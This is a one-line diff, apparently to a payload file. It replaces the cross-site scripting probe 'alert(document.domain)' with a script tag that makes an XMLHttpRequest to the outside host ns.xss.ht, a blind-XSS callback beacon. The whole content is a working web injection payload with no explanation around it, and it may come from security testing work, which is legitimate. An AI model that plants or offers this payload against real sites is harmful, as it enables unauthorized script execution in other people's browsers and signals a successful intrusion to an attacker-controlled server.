@@ -1,1 +1,1 @@
-alert(document.domain)
+<script>var req=new XMLHttpRequest();req.open("GET", "https://ns.xss.ht");req.send();</script>
